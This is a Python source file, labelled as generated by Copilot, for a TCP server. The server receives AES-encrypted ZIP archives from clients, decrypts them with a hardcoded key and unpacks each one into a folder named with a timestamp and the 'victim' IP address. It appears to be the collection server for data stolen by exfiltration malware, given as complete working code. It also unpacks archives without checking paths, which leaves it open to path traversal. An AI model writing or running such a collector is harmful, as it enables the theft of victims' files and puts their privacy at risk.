# Generated by Copilot
import os
import sys
import socket
import datetime
import zipfile
import io
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Hardcoded symmetric key (16 bytes for AES-128)
ENCRYPTION_KEY = b'supersecretkey!!'

def decrypt_data(data):
    """
    Decrypts the given data using AES encryption.
    Returns the decrypted data.
    """
    iv = data[:16]  # Extract the IV (first 16 bytes)
    encrypted_data = data[16:]  # The rest is the encrypted content
    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    return decrypted_data

def extract_zip(data, output_dir):
    """
    Extracts the ZIP archive from the given data into the specified output directory.
    """
    with zipfile.ZipFile(io.BytesIO(data), 'r') as zip_file:
        zip_file.extractall(output_dir)

def handle_client(client_socket, client_address):
    """
    Handles the incoming connection from a client.
    """
    print(f"Connection received from {client_address}")

    # Step 1: Receive the encrypted data
    encrypted_data = b""
    while True:
        chunk = client_socket.recv(4096)
        if not chunk:
            break
        encrypted_data += chunk

    # Step 2: Decrypt the data
    try:
        decrypted_data = decrypt_data(encrypted_data)
    except Exception as e:
        print(f"Error decrypting data: {e}")
        return

    # Step 3: Create a timestamped directory for the victim
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    victim_dir = f"{timestamp}_{client_address[0]}"
    os.makedirs(victim_dir, exist_ok=True)

    # Step 4: Extract the ZIP archive into the directory
    try:
        extract_zip(decrypted_data, victim_dir)
        print(f"Data extracted to {victim_dir}")
    except Exception as e:
        print(f"Error extracting ZIP archive: {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage: ./server363 <server_ip> <server_port>")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])

    # Step 1: Create a TCP socket and bind to the specified IP and port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((server_ip, server_port))
        server_socket.listen(5)  # Listen for up to 5 connections
        print(f"Server listening on {server_ip}:{server_port}")

        while True:
            # Step 2: Accept a connection from a client
            client_socket, client_address = server_socket.accept()
            with client_socket:
                handle_client(client_socket, client_address)

if __name__ == "__main__":
    main()